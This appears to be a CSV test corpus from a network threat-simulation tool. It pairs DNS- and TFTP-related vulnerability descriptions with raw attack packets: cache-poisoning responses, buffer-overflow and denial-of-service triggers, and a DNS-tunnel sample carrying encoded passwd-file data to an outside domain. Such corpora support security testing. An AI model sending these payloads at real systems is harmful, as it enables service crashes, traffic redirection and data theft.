XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP," 8||85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****"
FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP,)8||85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****
FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP,28||85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****
FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP,||3B ||8||85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****
FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP,||07 ||8||85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****
FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP,||0D ||8||85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****
FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP,||16 ||8||85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****
FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP,||1F ||8||85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****
﻿FSC20081023-05_Multiple_Vendors_libspf2_DNS_TXT_Record_Parsing_Buffer_Overflow.xml,Multiple Vendors libspf2 DNS TXT Record Parsing Buffer Overflow,There exists a buffer overflow vulnerability in the Sender Policy Framework library (libspf2). The flow is due to boundary error when processing crafted DNS TXT record. An attacker who runs a malicious DNS server can exploit this vulnerability by sending triggering email message to the target system. Successful attack could allow for executing arbitrary code with System or root level privileges.,DNS,UDP,||ED ||n||01 00 00 01 00 00 00 00 00 00 03 ||bar||06 ||toorrr||03 ||com||00 00 10 00 01||
FSC20081023-05_Multiple_Vendors_libspf2_DNS_TXT_Record_Parsing_Buffer_Overflow.xml,Multiple Vendors libspf2 DNS TXT Record Parsing Buffer Overflow,There exists a buffer overflow vulnerability in the Sender Policy Framework library (libspf2). The flow is due to boundary error when processing crafted DNS TXT record. An attacker who runs a malicious DNS server can exploit this vulnerability by sending triggering email message to the target system. Successful attack could allow for executing arbitrary code with System or root level privileges.,DNS,UDP,||ED ||n||85 00 00 01 00 02 00 00 00 00 03 ||bar||06 ||toorrr||03 ||com||00 00 10 00 01 C0 0C 00 10 00 01 00 00 00 00 00 0F FF ||v=spf1 mx +all||C0 0C 00 10 00 01 00 00 00 00 00 EA E9 ||AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
﻿FSC20090310-16_Microsoft_DNS_Server_WPAD_Registration_Spoofing.xml,Microsoft DNS Server WPAD Registration Spoofing,A spoofing vulnerability exists in Microsoft DNS Server which might allow a man-in-the-middle attack to be performed. The vulnerability is due to the way DNS Server handles dynamic update registration messages.            Remote attackers can exploit this vulnerability by sending a crafted WPAD registration message to the target server. Successful exploitation can allow an attacker to redirect Internet traffic and successfully perform a man-in-the-middle attack.,DNS,UDP,y||D2 ||(||00 00 01 00 01 00 02 00 01 04 ||test||03 ||com||00 00 06 00 01 04 ||wpad||04 ||test||03 ||com||00 00 05 00 FE 00 00 00 00 00 00 C0 1A 00 01 00 FF 00 00 00 00 00 00 C0 1A 00 01 00 01 00 00 04 B0 00 04 AC 10 04 ||d||09 ||1120-ms-7||07 ||2-43b9e$4294f43c-0da7-11de-7683-000c2924ec0e||00 00 FA 00 FF 00 00 00 00 00 ||H||03 ||gss||09 ||microsoft||03 ||com||00 00 00 ||I||B6 BC ||/||8C A0 00 ||%`#||06 09 ||*||86 ||H||86 F7 12 01 02 02 01 01 11 00 FF FF FF FF E1 B7 C1 97 D6 02 DB ||'||A1 A1 ||(hK||DD 96 ||7y||D2 00 00 00 00||
FSC20090310-16_Microsoft_DNS_Server_WPAD_Registration_Spoofing.xml,Microsoft DNS Server WPAD Registration Spoofing,A spoofing vulnerability exists in Microsoft DNS Server which might allow a man-in-the-middle attack to be performed. The vulnerability is due to the way DNS Server handles dynamic update registration messages.            Remote attackers can exploit this vulnerability by sending a crafted WPAD registration message to the target server. Successful exploitation can allow an attacker to redirect Internet traffic and successfully perform a man-in-the-middle attack.,DNS,UDP,y||D2 A8 00 00 01 00 01 00 02 00 01 04 ||test||03 ||com||00 00 06 00 01 04 ||wpad||04 ||test||03 ||com||00 00 05 00 FE 00 00 00 00 00 00 C0 1A 00 01 00 FF 00 00 00 00 00 00 C0 1A 00 01 00 01 00 00 04 B0 00 04 AC 10 04 ||d||09 ||1120-ms-7||07 ||2-43b9e$4294f43c-0da7-11de-7683-000c2924ec0e||00 00 FA 00 FF 00 00 00 00 00 ||H||03 ||gss||09 ||microsoft||03 ||com||00 00 00 ||I||B6 BC ||/||8C A0 00 ||%`#||06 09 ||*||86 ||H||86 F7 12 01 02 02 01 01 11 00 FF FF FF FF B2 C6 ||#||FE C8 9C AF AF E8 06 DB ||V)||08 CD ||Ny||D2 00 00 00 00||
﻿FSC20090922-01_Dnsmasq_TFTP_Service_Remote_Heap_Buffer_Overflow.xml,Dnsmasq TFTP Service Remote Heap Buffer Overflow,A heap based buffer overflow vulnerability has been reported in Dnsmasq. The vulnerability is due to improper bounds checking when handling TFTP Read requests. A remote attacker can exploit this vulnerability by sending a specially crafted RRQ packet to the target server. Successful exploitation of this vulnerability can lead to arbitrary code execution within the security context of the affected service. An unsuccessful code execution attempt can lead to abnormal termination of the vulnerable program.,TFTP,UDP,||00 01 ||AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
FSC20090922-01_Dnsmasq_TFTP_Service_Remote_Heap_Buffer_Overflow.xml,Dnsmasq TFTP Service Remote Heap Buffer Overflow,A heap based buffer overflow vulnerability has been reported in Dnsmasq. The vulnerability is due to improper bounds checking when handling TFTP Read requests. A remote attacker can exploit this vulnerability by sending a specially crafted RRQ packet to the target server. Successful exploitation of this vulnerability can lead to arbitrary code execution within the security context of the affected service. An unsuccessful code execution attempt can lead to abnormal termination of the vulnerable program.,TFTP,UDP,||00 01 ||AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
FSC20090922-01_Dnsmasq_TFTP_Service_Remote_Heap_Buffer_Overflow.xml,Dnsmasq TFTP Service Remote Heap Buffer Overflow,A heap based buffer overflow vulnerability has been reported in Dnsmasq. The vulnerability is due to improper bounds checking when handling TFTP Read requests. A remote attacker can exploit this vulnerability by sending a specially crafted RRQ packet to the target server. Successful exploitation of this vulnerability can lead to arbitrary code execution within the security context of the affected service. An unsuccessful code execution attempt can lead to abnormal termination of the vulnerable program.,TFTP,UDP,||00 01 ||AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
﻿SymantecFirewallDNSDOS.xml,Symantec Firewall DNS Response Denial of Service,"This threat sends a DNS packet where the compressed name pointer points back to itself, causing various Symantec Firewall applications to cause the kernel to go into an infinite loop.",DNS,UDP,||DF B2 80 00 00 01 00 01 00 00 00 00 C0 0C||
﻿SymantecFirewallDNSDOS2.xml,Symantec Firewall DNS Response Buffer Overflow,"This threat sends a large DNS reply to a an open UDP port - such as 137. The Symantec firewall software will attempt to read the DNS packet, and overflow a buffer it has allocated for to read it. Can be used for remote execution of code.",DNS,UDP,||00 01 81 80 00 01 00 01 00 00 00 00 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 00 00 01 00 01 c0 0c 00 01 00 01 00 01 4f 4f 00 04 82 ||Q@||12 00||
﻿TSL20140613-02_ISC_BIND_EDNS_Option_Processing_Denial_of_Service.xml,ISC BIND EDNS Option Processing Denial of Service,A denial of service vulnerability exists in ISC BIND. The vulnerability is caused by an assertion failure when processing the EDNS option. A remote attacker may exploit this vulnerability by sending a specially crafted query to the affected servers. Successful exploitation would result in the BIND service terminating unexpectedly.,DNS,UDP,||F1 01 00 00 01 00 00 00 00 00 01 11 ||telussecuritylabs||03 ||com||00 00 01 00 01 00 00 ||)||02 00 00 00 80 00 00 00||
TSL20140613-02_ISC_BIND_EDNS_Option_Processing_Denial_of_Service.xml,ISC BIND EDNS Option Processing Denial of Service,A denial of service vulnerability exists in ISC BIND. The vulnerability is caused by an assertion failure when processing the EDNS option. A remote attacker may exploit this vulnerability by sending a specially crafted query to the affected servers. Successful exploitation would result in the BIND service terminating unexpectedly.,DNS,UDP,||F1 85 80 00 01 00 01 00 00 00 01 11 ||telussecuritylabs||03 ||com||00 00 01 00 01 11 ||telussecuritylabs||03 ||com||00 00 01 00 01 00 09 3A 80 00 04 AC 10 08 E6 00 00 ||)||10 00 00 00 00 00 00 D6 00 03 00 D2 ||AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
﻿TSL20140616-01_PHP_php_parserr_DNS_TXT_Hea_Buffer_Overflow.xml,PHP php_parserr DNS_TXT Heap Buffer Overflow,A heap buffer vulnerability exists in the php_parserr() function in PHP. The vulnerability is due to an error in parsing malformed DNS TXT records. >An attacker can exploit this vulnerability if the application uses the vulnerable function. A successful attack can allow arbitrary code execution in the context of the PHP application. An unsuccessful attack will result in a denial of service condition.,DNS,UDP,||A7 D3 01 00 00 01 00 00 00 00 00 00 06 ||tslpoc||03 ||com||00 00 10 00 01||
TSL20140616-01_PHP_php_parserr_DNS_TXT_Hea_Buffer_Overflow.xml,PHP php_parserr DNS_TXT Heap Buffer Overflow,A heap buffer vulnerability exists in the php_parserr() function in PHP. The vulnerability is due to an error in parsing malformed DNS TXT records. >An attacker can exploit this vulnerability if the application uses the vulnerable function. A successful attack can allow arbitrary code execution in the context of the PHP application. An unsuccessful attack will result in a denial of service condition.,DNS,UDP,||A7 D3 81 80 00 01 00 01 00 00 00 00 06 ||tslpoc||03 ||com||00 00 10 00 01 C0 0C 00 10 00 01 ||||FF FF FF 00 01 FF ||AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
﻿dns_data_smuggling.xml,Sample of Data Smuggling and Arbitrary Command Execution Via DNS a Based Rootkit,"This threat simulates the use of a clandestine DNS channel using a custom DNS server and DNS recursion as a data transport, this data is a TLV structure which is base64 encoded swapping the ""/"" and ""-"" character to comply with various DNS RFCs (breaking various Base64 RFCs), in reply the rootkit is told to execute ""ls -l /archive"". This threat uses the DNS service which typically listens on port 53.",DNS,UDP,||12 F0 00 00 00 01 00 00 00 00 00 00 3A ||AQRldGgwAgTAqAIGAwYAUNobMmYEBP---wAFBMCoAv8GN21vbjp4OjI6Mj||3A ||pkYWVtb246L3NiaW46L2Jpbi9mYWxzZQphZG06eDozOjQ6YWRtOi92YXIv||01 ||a||0B ||stonedcoder||03 ||org||00 00 01 00 01||
dns_data_smuggling.xml,Sample of Data Smuggling and Arbitrary Command Execution Via DNS a Based Rootkit,"This threat simulates the use of a clandestine DNS channel using a custom DNS server and DNS recursion as a data transport, this data is a TLV structure which is base64 encoded swapping the ""/"" and ""-"" character to comply with various DNS RFCs (breaking various Base64 RFCs), in reply the rootkit is told to execute ""ls -l /archive"". This threat uses the DNS service which typically listens on port 53.",DNS,UDP,||89 84 00 00 00 01 00 00 00 00 00 00 3A ||AQRldGgwAgTAqAIGAwYAUNobMmYEBP---wAFBMCoAv8GN21vbjp4OjI6Mj||3A ||pkYWVtb246L3NiaW46L2Jpbi9mYWxzZQphZG06eDozOjQ6YWRtOi92YXIv||01 ||a||0B ||stonedcoder||03 ||org||00 00 01 00 01||
